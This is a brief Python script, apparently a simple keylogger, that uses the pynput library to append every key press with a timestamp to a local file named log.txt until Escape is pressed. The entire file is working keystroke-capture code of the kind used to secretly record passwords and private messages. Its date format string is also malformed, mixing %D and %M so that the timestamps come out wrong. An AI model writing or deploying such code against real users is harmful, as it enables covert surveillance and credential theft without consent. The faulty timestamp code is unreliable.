from pynput import keyboard
from datetime import datetime

LOG_FILE = "log.txt"

def write_to_file(key):
    time = datetime.now().strftime("%D-%M-%Y, %H:%M:%D")
    
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
        
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{time}] {key_str}\n")
        
def on_press(key):
    write_to_file(key)
    
def on_release(key):
    if key == keyboard.Key.esc: #esc key stops the program
        print("Exiting...")
        return False  

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
